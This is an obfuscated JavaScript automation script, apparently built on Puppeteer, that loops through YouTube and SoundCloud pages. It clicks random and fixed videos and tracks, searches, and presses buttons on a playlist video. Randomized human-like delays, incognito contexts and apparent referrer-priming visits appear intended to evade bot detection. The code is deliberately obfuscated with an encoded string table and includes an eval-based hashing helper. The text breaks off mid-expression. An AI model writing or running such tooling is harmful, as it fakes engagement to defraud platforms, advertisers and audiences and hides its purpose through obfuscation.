const W = c,
  V = b,
  U = d;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (0x2 * -0x45b + -0x158 * 0x17 + 0xa1 * 0x3f))) + i;
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (-0x1563 + 0x1a5 + 0x26 * 0x85);
    let h = e[f];
    return h;
  }, d(b, c);
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](-0xe3a + -0x10 * 0x138 + 0x21ba * 0x1), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(0x2 * -0x1229 + -0x6ae7 * 0x1 + 0x10469 + (0xdfb * -0x3 + -0x63 * 0xbf + 0xae66) * random()) : await standardWaitForNetIdle(f), await wait(0x20be + -0x1 * -0x1e09 + -0x2b3f * 0x1 + (0x1b1f * -0x1 + 0x3af1 + -0x1 * -0x73e) * random()), -0xa * -0x238 + 0x227b + -0x38aa;
}
async function standardWaitForNetIdle(f) {
  return await wait(-0x12f1 + -0x1cbc + 0x4335), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), 0x24d + 0x21df + -0x242b;
}
async function randomWait() {
  return await wait(0x31c + -0x1167 + 0x21d3 + (-0xb * -0x92 + -0x199d + 0x26df) * random()), 0x1 * 0x2047 + -0x1 * 0x410 + -0x1c36;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](0x131 + 0xf4 + -0x225, 0xf * -0x137 + -0x2cb + 0x150b), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((-0x33f5 * -0x8 + -0x6c23 + 0x6b * -0xaf) * getRandomInt(-0x186a + 0x796 * -0x2 + 0x2798, 0x1 * 0x19c + -0xb * 0xb7 + 0x646), h)), 0x13b + -0x2494 * -0x1 + -0x64d * 0x6;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = 0x1985 + 0x7 * 0x8b + 0x36 * -0x8b;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[-0x71 * 0x22 + 0xb12 + 0x3f1]['split']('\x20');
    for (let k = 0x22 * -0x71 + 0xa * 0x2ea + 0x192 * -0x9; k < i['length']; k += 0x9e6 + 0x22e + -0xc12)
      j += i[k] * h[i[k + (-0x158e + -0x2b * 0xd + -0xbdf * -0x2)]];
    return j;
  });
}

function a() {
  const bl = [
    'g8oqh8kPWRdcSKTcW59t',
    'rm7lNIIOQC',
    'W4LSBSkMe1BdNMyAua',
    'CMvWBgfJzq',
    'CMfUzg9T',
    'CMCVzw4VC2nYAq',
    '--disable-',
    'W6eOW7pdM8kwtSonWOrLdG',
    'rMLYzwzVEa',
    'uKjtsefingLxvq',
    'serUserDat',
    'g38dW4KBs8oUWPzvsG',
    'ate,\x20br',
    'ASoIWPBcImoYWO7cMSoVWPFcSG',
    'WP9XjCowALvin8oJxq',
    'wkjndwqkdw',
    'WOO1oHJdKYm3edFdHq',
    'z2v0qxr0CMLIDq',
    'CMvJDa',
    '-good-fit-',
    'rNvqvMy4nxPnAq'
  ];
  a = function() {
    return bl;
  };
  return a();
}
async function anchorAndView(f) {
  const R = b;
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](-0x22ab + 0x2590 * 0x1 + 0x2df * -0x1)['map'](l => Array['from'](l['children']))['flat'](-0x1fdd + 0x2475 * 0x1 + -0xeb * 0x5)['map'](l => l['childNodes'][0x7e7 + -0xe2d + -0x1 * -0x647]['childNodes'][0x2583 + 0xed2 + -0x3455 * 0x1]['childNodes'][0x207a + -0x216 * -0xb + 0x1279 * -0x3]['childNodes'][0x8d6 + 0x249a + 0x2d70 * -0x1]['childNodes'][0x21f + -0x1983 * 0x1 + 0x1 * 0x1765]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(-0x3b * 0x64 + 0xa0 * 0x2f + 0x1f * -0x14, -0x1010 + -0x245b * 0x1 + -0x1 * -0x47f3)), await f['click'](R(0xd, 'PT^C') + 'idToWatch'), await wait(0x1 * -0x6673 + -0x3 * 0x26a5 + 0x114fa);
  const h = await getMaxTime(f),
    i = Math['min']((-0x6c0e * 0x1 + -0x224b + -0x20f * -0xb7) * getRandomInt(-0x2524 + 0x1021 + 0x1505, 0x21cf + -0x1 * -0x1c27 + -0x65 * 0x9d), h);
  return await wait(i), -0xee4 + 0xf * -0x11f + 0x1fb6;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    const S = c;
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math[S(0x4)]() * h['length'])])['children'][-0x1d79 + -0xd * -0x2c3 + -0x66e]['children'][-0x1 * 0x2b4 + -0x2186 + 0x243a]['children'][-0xc4f * -0x3 + -0x149 * -0x2 + -0x277f]['children'][0x19 * -0x143 + 0x380 * 0x1 + 0x1c0b]['children'][-0xaf3 * -0x3 + 0x503 * -0x5 + -0x7ca]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), -0x82f * 0x1 + 0x1 * -0x107b + 0x1a5 * 0xf;
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (-0x1563 + 0x1a5 + 0x26 * 0x85);
    let h = e[f];
    if (c['iiCCjb'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = -0x267b * 0x1 + -0x227e * 0x1 + 0x48f9, r, s, t = -0x5 * 0xb9 + -0xd * 0x226 + 0x1f8b; s = m['charAt'](t++); ~s && (r = q % (-0x8d * -0x13 + 0x67 * 0x14 + -0x127f) ? r * (-0x10 * 0x138 + 0xf38 * -0x1 + 0x22f8) + s : s, q++ % (0x1 * -0x11d1 + 0x1763 + -0x58e)) ? o += String['fromCharCode'](0x4a9 * -0x3 + -0x21 * 0xbf + 0x2799 & r >> (-(0x20be + -0x1 * -0x1e09 + -0x3ec5 * 0x1) * q & 0x6c8 * -0x2 + 0x1d79 + -0x1 * 0xfe3)) : -0xa * -0x238 + 0x227b + -0x38ab) {
          s = n['indexOf'](s);
        }
        for (let u = -0x12f1 + -0x1cbc + 0x2fad, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](0x24d + 0x21df + -0x241c))['slice'](-(0x31c + -0x1167 + 0xe4d));
        }
        return decodeURIComponent(p);
      };
      c['AgjbJZ'] = i, b = arguments, c['iiCCjb'] = !![];
    }
    const j = e[-0xb * -0x92 + -0x199d + 0x1357],
      k = f + j,
      l = b[k];
    return !l ? (h = c['AgjbJZ'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': -0x26d3 + 0x1 * -0xb75 + 0x1 * 0x32ac + (0x4 * 0x51e + 0x2614 + -0x856 * 0x7) * random()
  }), await wait(0x120c + -0xd15 + 0x101 * -0x3 + (0xf1 * 0x17 + -0x1a3 * -0x11 + -0x304e) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][0x1c08 + 0x6 * 0x51e + -0x3aba]['childNodes'][-0x5 * -0x73 + 0x2 * -0x1176 + 0x2f * 0xb2]['childNodes'][-0x6 * -0x643 + -0x174c + -0xe45]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][-0x216a + -0x22da + 0x4449]['childNodes'][-0x13 * -0x1a7 + 0x1 * 0x196b + -0x38d0]['childNodes'][-0x8 * -0x307 + 0x4f * 0x1d + 0x2129 * -0x1]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](-0xe * 0x268 + 0x5b1 * -0x1 + 0x2762),
          r = -0x31b + -0x25ba * -0x1 + -0x229f;
        for (let u = 0xd28 + -0x39e + -0x98a; u < q['length']; u += -0x20d * 0x1 + -0x1bad + 0x2b4 * 0xb)
          r += q[u] * k[q[u + (0x11bb + -0x25 * -0x6b + -0x2131)]];
        return r;
      }(n);
  });
  await wait((0x512f * 0x1 + -0x29 * -0x3f + -0x2 * 0x1057) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((-0xdb5 * -0xf + 0x49 * -0x1d1 + 0xa15e) * getRandomInt(-0x2 * -0xe6b + -0xc2 * 0xa + -0x1541 * 0x1, 0x22e7 + 0x8 * 0x32f + -0x3c55), h + (0x1 * 0x2193 + 0x3cf + -0x5 * 0x392));
  return await wait(i), 0x2669 + 0x67 * 0x5b + -0x5 * 0xf01;
}
async function keyWatch(f) {
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), -0x1363 + 0x4 * -0x1cf + 0x2f * 0x91), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, 0x4ab + -0x266 + 0x1 * 0x973 + (-0x1 * 0xed + -0x926 * -0x2 + -0xd77) * Math['random']());
    });
  }, -0x1cd1 + -0x17 * 0x1c3 + 0x60ae);
  await wait(0x74834 + 0x127 * 0x763 + -0x3 * 0x3bd23);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((-0xcb * 0x58 + -0x1445d + 0xd * 0x3059) * getRandomInt(-0x207 + -0x1718 + 0x21 * 0xc3, -0x1ff6 + -0x10e8 + 0x30f7)), clearInterval(h), 0x18e + -0x1de3 + -0x117 * -0x1a;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = 0x8 * -0x1ae + 0x23fc + -0x168c;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return 0x9e0 + -0x158f + 0xbb * 0x10;
    await randomWait();
  }
  return 0x2429 * 0x1 + 0x19ba + 0xb2 * -0x59;
}

function fetchRandomSC() {
  return Math['random']() <= -0x1e95 + 0xc12 + 0x1283 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < 0x1a8c + -0x3b * -0x21 + 0x4e1 * -0x7 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= 0xc09 + 0x7 * -0x59 + -0x99a + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = -0x1 * 0x1993 + -0x8d7 + 0x371 * 0xa;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(-0x24f0 * -0x6 + -0x263e + -0x79a + getRandomInt(0x24c8 + -0xead + 0x247d, -0xb9b0 + -0x35 * -0x30 + -0x6d0 * -0x2b));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](-0x49 * 0x14 + -0x370 * 0x5 + 0x16e5), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = 0xef7 * 0x2 + 0x141d + -0x1 * 0x320b;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](0x3d * -0x35 + 0x1d9e + -0x10fd, -0x4be * 0x5 + 0x2cf * -0x7 + 0x1 * 0x2b91)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, 0x17e5 * 0x1 + -0x1dc0 + -0x1 * -0xdab + floor((0x1753 + -0x387 + -0xfe4) * random()))), log('p2'), log(await s['evaluate'](() => {
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(-0x5ae3dc5e * -0x1 + -0x167 * 0x86303c + 0xe149c7c6),
          -0x31f22b + -0xe4d70 * 0x1 + 0xc03f9b,
          -0x5 * 0x193e + -0x845d + 0x18293 * 0x1,
          -0x2 * -0x793 + -0x1 * 0x742 + -0x764
        ], y = [
          0x5 * 0x6c9 + 0xe06 + -0x2fdb,
          -0x878 + -0x1 * 0x17f5 + 0x1 * 0x207d,
          0x2371 + 0x8e * 0x11 + 0x2cd7 * -0x1,
          0xdfc + 0x22ae + -0x1855 * 0x2
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(-0x4e3 * 0x7 + -0x2690 + 0x5a * 0xcf)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = 0xd2d * -0x1 + -0x1e04 + -0x1 * -0x2b31; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(-0x2b7 + 0x22fd + 0x11 * -0x1e6) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[0xd15 + 0xd * -0x41 + -0x139 * 0x8] = A[-0x183c + -0x868 + 0x1a * 0x142] = A[0x8c6 + 0x2 * -0x34a + -0x231] = A[-0x22f1 + -0x186e + 0x233 * 0x1b] = A[0x3be * 0x2 + -0x1 * -0xd57 + -0x14d0] = A[0x31d + 0xa * -0x199 + 0xce1] = A[0x2479 + -0x1 * -0xd76 + -0x31ea] = A[-0x19 * 0xdb + -0x51a * -0x2 + 0xb35 * 0x1] = A[0x60 * 0x5c + 0x461 + -0x1 * 0x26da] = A[0xed * 0xa + 0x1e * -0xc8 + 0x1 * 0xe36] = A[-0x1d92 + 0x2d * 0x3a + 0x1 * 0x1369] = A[0x2 * 0x3ca + 0x2 * -0xdbd + -0x1 * -0x13f0] = A[-0x8ad * 0x2 + -0x2 * 0xd6b + 0x1 * 0x2c3b] = A[0xedd + -0x3 * -0xc7 + -0x1126] = A[0xd5b + -0x13dd + 0x68f] = A[-0x43 * -0x5d + 0x114d + -0x14cb * 0x2] = A[0x1830 + -0xd3e + 0x3 * -0x3a1] = -0x8c3 + 0xb + -0x48 * -0x1f, this['blocks'] = A) : this['blocks'] = [
                -0x1cbf + -0x15c0 + 0x327f,
                0x22bc + 0x23db + -0x4697,
                0x1a0b + 0x87 + -0x1a92,
                0x169 + -0x1 * -0x2632 + -0x1 * 0x279b,
                0x30a + -0x1695 + -0x1 * -0x138b,
                0x1094 + -0x122b + 0x197,
                -0xdde + 0x24e6 + 0x5c2 * -0x4,
                -0x1397 + -0x2b * 0xdf + -0x1c86 * -0x2,
                0x2211 + 0x137c + 0x1 * -0x358d,
                -0x269b + -0x33e + 0x29d9,
                0x7d * 0x4a + -0xfb0 + -0x1472,
                0x89 * 0x21 + 0x5 * 0x30 + 0x3 * -0x633,
                0x26b3 * 0x1 + -0x7f * 0xb + -0xb9 * 0x2e,
                0x3 * -0x4ae + 0x58f + 0x87b,
                0xcd1 + -0x49 * -0x2f + -0xd1c * 0x2,
                0x8 * -0x50 + 0x1d20 + -0x1aa0,
                -0x2b * -0xc1 + 0x1 * 0x5f2 + -0x3d * 0xa1
              ], this['h0'] = 0x5d1ac06f + -0x731767f5 + 0x7d41ca87, this['h1'] = 0xa * -0x2c7a2970 + -0x9ff92faa + -0x4a11d * -0xb66f, this['h2'] = 0xaf447adb * -0x1 + 0x2 * 0x31c02029 + 0x3 * 0x4c2a5d2d, this['h3'] = 0x12313e07 + 0x9577b78 + -0xb566509, this['h4'] = -0x259 * -0x5d4331 + 0x7 * 0x1e34a4b5 + -0xea905d0c, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = -0x6b3 + -0x1 * 0x7f9 + 0xeac, this['finalized'] = this['hashed'] = -0x2407 + 0x1f5d + 0x4aa, this['first'] = 0x1f40 + -0x1 * 0xe78 + 0x1 * -0x10c7;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = -0xf0 * -0xb + 0x7ce + -0x121e, O = J['length'] || 0x24ca * -0x1 + 0x2a * 0xbd + 0x25 * 0x28, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = -0x1 * 0x29 + 0x751 * -0x2 + 0xecb, P[0x1 * -0x11a7 + 0x1 * -0x649 + -0x17f0 * -0x1] = this['block'], P[0x7fc + -0x3 * -0xbff + -0x2be9] = P[-0x4b1 + 0xe13 + -0x961] = P[-0x1 * -0x2573 + 0x3 * 0x147 + -0x2946] = P[-0x4 * 0x657 + 0xaae * 0x3 + -0x6ab] = P[-0x463 * -0x2 + 0x88d * -0x1 + -0x35] = P[-0x35 * 0x35 + -0x23f0 + 0x2eee] = P[-0x1b79 * 0x1 + 0x6 * -0xf0 + 0x211f] = P[0x1981 * -0x1 + -0x151 * -0xc + -0x2 * -0x4de] = P[0x1 * -0x1a33 + -0x91a * 0x2 + 0x2c6f] = P[0x1f0d + 0x1c78 + -0x234 * 0x1b] = P[0x1388 + -0xf45 + -0x439] = P[0xea5 + -0x2 + -0xe98] = P[0xcb * -0xe + 0xb3a + -0x2 * 0xa] = P[-0x7b * 0x21 + 0x161 * -0x17 + -0xa7 * -0x49] = P[0x1 * -0x9f7 + -0x1574 + 0x1f79] = P[0x5 * 0x41c + 0x123 * 0x1a + 0x320b * -0x1] = 0xd26 * 0x1 + 0x61 * -0xe + 0xfb * -0x8), K) {
                    for (N = this['start']; M < O && N < 0xf67 * -0x1 + -0x148d + 0x2434; ++M)
                      P[N >> -0x173f + -0x162e + 0x2d6f] |= J[M] << y[0x1695 + 0x268 + -0x18fa & N++];
                  } else {
                    for (N = this['start']; M < O && N < 0xa3 * 0x11 + -0xf1 * 0x24 + -0x1751 * -0x1; ++M)
                      (L = J['charCodeAt'](M)) < -0xddf + -0x2f * -0x35 + -0x4a4 * -0x1 ? P[N >> -0x537 + -0x8b * 0x3 + 0x6da] |= L << y[-0x17d6 + 0x22d8 + 0xaff * -0x1 & N++] : L < 0x8ef + -0x13f4 + -0x1305 * -0x1 ? (P[N >> -0x4c1 * 0x4 + 0x4c0 + 0xe46] |= (-0x8d1 * -0x2 + -0xbb6 + -0x52c | L >> -0x35 * -0x2b + 0x7e3 + 0x74 * -0x25) << y[0xf4e * -0x2 + 0x14 * -0x133 + -0x7 * -0x7cd & N++], P[N >> -0x13 * 0x1 + -0x105e + 0x1 * 0x1073] |= (-0x18dd * -0x1 + 0x14ca + -0x2d27 * 0x1 | 0x32b * 0x4 + 0x16a1 + -0x230e & L) << y[-0xefe + 0x1e17 + 0x1 * -0xf16 & N++]) : L < 0x1 * 0x8af + 0xf * -0x12c1 + 0x1e8a0 || L >= 0xf854 + -0x80cc + 0x6878 ? (P[N >> -0x1343 * -0x1 + 0x17e * -0x9 + -0x5d3] |= (-0x130f + -0x1c60 + 0x304f | L >> -0x2 * -0xd94 + 0x152a + 0x2 * -0x1823) << y[0x187b + 0x1425 + 0x51 * -0x8d & N++], P[N >> 0xb5a + -0x1ae1 + 0xf89] |= (-0xeea * -0x1 + -0x4c * -0x1f + 0x1 * -0x179e | L >> 0xe4f + -0x539 * 0x7 + 0x1 * 0x1646 & 0x225 + -0x353 + 0x16d) << y[0x181d + 0x733 + -0x1 * 0x1f4d & N++], P[N >> 0x7 * -0x4c9 + 0x19d9 + -0x1ea * -0x4] |= (-0x3 * -0xace + -0xcdd + -0x130d | -0x20d3 + -0x45f * 0x3 + 0x699 * 0x7 & L) << y[0x1 * -0xc8f + 0x2393 * 0x1 + -0xd * 0x1c5 & N++]) : (L = 0x10fe * -0xa + -0x1e23f + 0x38c2b + ((-0xc69 + 0x136 * -0x1 + -0x119e * -0x1 & L) << 0x11e * -0x22 + 0x1baa * -0x1 + 0x41b0 | 0x2020 + -0x2 * 0x141 + -0x199f & J['charCodeAt'](++M)), P[N >> -0xc1 + 0xd80 + -0xcbd] |= (-0x1d * 0x14b + 0x469 + -0x2206 * -0x1 | L >> -0x2 * 0x58a + -0x23e8 + -0x1 * -0x2f0e) << y[-0x116e * -0x1 + 0xf04 + -0x206f & N++], P[N >> -0x832 * -0x1 + 0x4 * -0x641 + 0x10d4] |= (-0x199 * 0xd + 0x129b + 0x2aa | L >> -0x1cd * 0x13 + -0x1 * 0x261f + 0x55 * 0xda & -0x102b + -0x1417 + -0x3 * -0xc2b) << y[0x1 * -0x237b + -0x2 * 0x7e6 + 0x334a & N++], P[N >> -0x1 * 0xe63 + -0x19f4 + 0x2859] |= (-0x11e6 + 0x1d06 + 0x2 * -0x550 | L >> 0x12f5 + 0x0 + -0x12ef & 0x383 * -0x6 + -0x15a3 + -0x2af4 * -0x1) << y[0x7 * -0x34f + -0x1 * -0xafb + -0x1 * -0xc31 & N++], P[N >> -0x96b * 0x4 + 0x1054 + -0x1 * -0x155a] |= (-0xf06 + -0x1f * -0xec + 0x6 * -0x22d | 0x1 * 0x491 + -0x1d * 0x21 + -0x95 & L) << y[-0x1e31 + -0xd4a + 0x2b7e & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= -0x127 * 0x6 + 0xe1 * 0x17 + -0x101 * 0xd ? (this['block'] = P[-0x1 * -0x1fcf + -0x11 * 0x1ff + 0x230], this['start'] = N - (0x1d64 + -0x355 * -0x3 + -0x2723), this['hash'](), this['hashed'] = -0x9f * 0xb + 0x2101 + 0xb * -0x261) : this['start'] = N;
                }
                return this['bytes'] > 0x13 * -0x19756c61 + 0x40fe9 * 0x7253 + -0x1135020a7 * -0x1 && (this['hBytes'] += this['bytes'] / (-0x2 * 0x151acd8e + 0x25d6462e * -0x4 + 0x1 * 0x1c18eb3d4) << -0x1f21 * -0x1 + -0x1b1 + -0x1d70, this['bytes'] = this['bytes'] % (-0x6358b58c + -0xa * -0x31c457d6 + -0x8e52b8d0)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = -0x1781 + -0x1 * -0x21dd + -0xa5b;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[-0x1 * -0x1a29 + 0x5bd * 0x1 + 0xfeb * -0x2] = this['block'], J[K >> 0x1913 + 0x1540 + -0x2e51] |= x[0x29 * 0xe1 + -0x17 * -0x174 + -0x4572 & K], this['block'] = J[0x5 * -0x11 + -0x45 * 0x6 + 0x203], K >= 0x23 * -0x5e + -0x100f * -0x1 + 0x33 * -0xf && (this['hashed'] || this['hash'](), J[-0x692 * -0x1 + -0x7a * 0x6 + -0x3b6] = this['block'], J[0x39 * 0x6 + -0x606 + -0x10 * -0x4c] = J[0x8ff + -0x4a3 * 0x4 + -0x1 * -0x98e] = J[0x1 * -0x1b7 + -0x7 * -0x1ba + -0x7 * 0x17b] = J[0x1 * -0x20ab + 0x25c * 0x4 + 0x173e] = J[0x199 * 0x4 + -0x3 * 0x29f + -0x17d * -0x1] = J[0x9 * 0xbf + -0x1 * -0x1f49 + 0x3 * -0xca9] = J[-0x23a4 + -0x21a + 0x25c4] = J[-0x1 * -0x13ba + -0x142e + -0x1 * -0x7b] = J[0x1a3 * -0x3 + -0x196e * -0x1 + -0x147d] = J[-0xa72 * -0x2 + -0x6 * -0x565 + 0x1 * -0x3539] = J[0x1cec + 